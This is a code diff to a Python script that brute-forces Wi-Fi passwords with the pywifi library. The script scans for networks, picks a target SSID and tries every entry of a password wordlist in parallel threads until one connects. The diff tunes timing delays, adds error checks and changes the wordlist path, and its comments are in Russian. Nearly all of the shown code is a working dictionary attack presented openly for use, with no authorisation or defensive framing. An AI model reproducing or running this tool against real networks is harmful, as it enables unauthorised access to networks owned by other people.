@@ -7,7 +7,7 @@ def scan_networks():
     wifi = pywifi.PyWiFi()
     iface = wifi.interfaces()[0]
     iface.scan()
-    time.sleep(3)
+    time.sleep(2)  # Уменьшено время ожидания
     scan_results = iface.scan_results()
     networks = []
 
@@ -21,7 +21,7 @@ def test_password(ssid, password):
     iface = wifi.interfaces()[0]
 
     iface.disconnect()
-    time.sleep(1)
+    time.sleep(5)  # Увеличено время ожидания для корректного отключения
 
     if iface.status() == const.IFACE_DISCONNECTED:
         profile = pywifi.Profile()
@@ -35,7 +35,7 @@ def test_password(ssid, password):
         tmp_profile = iface.add_network_profile(profile)
 
         iface.connect(tmp_profile)
-        time.sleep(3)  # Уменьшено время ожидания
+        time.sleep(10)  # Увеличено время ожидания для подключения
 
         if iface.status() == const.IFACE_CONNECTED:
             print(f'Success! Password for {ssid} is {password}')
@@ -44,9 +44,17 @@ def test_password(ssid, password):
         else:
             print(f'Failed to connect to {ssid} with password: {password}')
             return False
+    else:
+        print(f'Interface status is not disconnected for network {ssid}')
+        return False
+
 
 def main():
     networks = scan_networks()
+
+    if not networks:
+        print("No networks found.")
+        return
 
     print("Available networks:")
     for idx, network in enumerate(networks):
@@ -58,14 +66,15 @@ def main():
         ssid = networks[choice]
         print(f'Selected network: {ssid}')
 
-        with open('WifiPassword.txt', 'r') as f:
+        with open('BrutforceWifi/WifiPassword.txt', 'r') as f:
             passwords = f.readlines()
 
         # Параллельная проверка паролей
         with ThreadPoolExecutor(max_workers=10) as executor:
             futures = [executor.submit(test_password, ssid, password.strip()) for password in passwords]
             for future in as_completed(futures):
-                if future.result():
+                result = future.result()
+                if result:
                     print("Password found!")
                     break
     else:
